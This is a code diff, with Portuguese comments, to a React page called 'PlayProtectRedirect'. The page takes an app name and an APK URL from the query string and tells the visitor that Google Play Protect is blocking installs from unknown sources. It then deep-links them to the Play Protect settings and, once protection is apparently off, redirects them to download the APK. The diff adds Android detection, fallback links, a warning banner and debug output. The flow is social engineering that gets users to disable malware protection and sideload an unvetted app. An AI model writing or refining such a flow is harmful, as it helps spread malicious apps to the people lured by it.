@@ -4,6 +4,17 @@ import { useLocation } from "wouter";
 export function PlayProtectRedirect() {
   const [, setLocation] = useLocation();
   const [isChecking, setIsChecking] = useState(false);
+  const [isAndroid, setIsAndroid] = useState(false);
+
+  // Detectar se está em Android
+  useEffect(() => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isAndroidDevice = /android/.test(userAgent);
+    setIsAndroid(isAndroidDevice);
+    
+    console.log("📱 User Agent:", userAgent);
+    console.log("🤖 Is Android:", isAndroidDevice);
+  }, []);
 
   // Obter parâmetros da URL
   useEffect(() => {
@@ -21,19 +32,25 @@ export function PlayProtectRedirect() {
     console.log("✅ Página de Play Protect carregada:", { file, app, url });
   }, [setLocation]);
 
-  // Abrir Play Protect Settings com múltiplos métodos
+  // Abrir Play Protect Settings
   const openPlayProtectSettings = () => {
     console.log("🔓 Abrindo Play Protect Settings...");
     
-    // Método 1: Abrir Google Play Store diretamente
-    // Em Android, isso abre o app do Google Play onde Play Protect está
-    window.location.href = "market://details?id=com.android.vending";
-    
-    // Método 2: Fallback após 3 segundos - Abrir via HTTPS
-    setTimeout(() => {
-      console.log("🌐 Fallback: Abrindo Google Play via HTTPS...");
-      window.location.href = "https://play.google.com/store/apps/details?id=com.android.vending";
-    }, 3000);
+    if (isAndroid) {
+      // Em Android: usar deep link market://
+      console.log("📱 Usando deep link market:// para Android");
+      window.location.href = "market://details?id=com.google.android.gms";
+      
+      // Fallback após 2 segundos se market:// não funcionar
+      setTimeout(() => {
+        console.log("🌐 Fallback: Abrindo Google Play...");
+        window.location.href = "https://play.google.com/";
+      }, 2000);
+    } else {
+      // Em navegador web: redirecionar direto para HTTPS
+      console.log("🌐 Navegador web: Abrindo Google Play");
+      window.location.href = "https://play.google.com/";
+    }
   };
 
   // Verificar se Play Protect foi desativado
@@ -51,6 +68,7 @@ export function PlayProtectRedirect() {
       
       if (url) {
         // Redirecionar para download do APK
+        console.log("📥 Redirecionando para:", url);
         window.location.href = url;
       }
       
@@ -73,6 +91,17 @@ export function PlayProtectRedirect() {
             </h1>
             <p className="text-slate-400 text-sm">
               Tamanho: {(parseInt(size) / 1024).toFixed(2)} KB
+            </p>
+          </div>
+
+          {/* Alerta de Proteção */}
+          <div className="bg-blue-900 border border-blue-700 rounded p-4 space-y-2">
+            <p className="text-blue-300 font-semibold text-sm flex items-center gap-2">
+              <span>ℹ️</span>
+              <span>Proteção do Google Play</span>
+            </p>
+            <p className="text-blue-200 text-xs">
+              O Google Play Protect está bloqueando a instalação de apps de fontes desconhecidas.
             </p>
           </div>
 
@@ -131,6 +160,14 @@ export function PlayProtectRedirect() {
             Este aplicativo requer permissões especiais para funcionar corretamente.
             Siga os passos para uma instalação bem-sucedida.
           </p>
+
+          {/* Debug Info */}
+          <div className="bg-slate-900 rounded p-3 text-xs text-slate-400 space-y-1">
+            <p>🔍 Debug Info:</p>
+            <p>📱 Android: {isAndroid ? "Sim" : "Não (Navegador Web)"}</p>
+            <p>📦 App: {app}</p>
+            <p>📊 Tamanho: {(parseInt(size) / 1024).toFixed(2)} KB</p>
+          </div>
         </div>
       </div>
     </div>
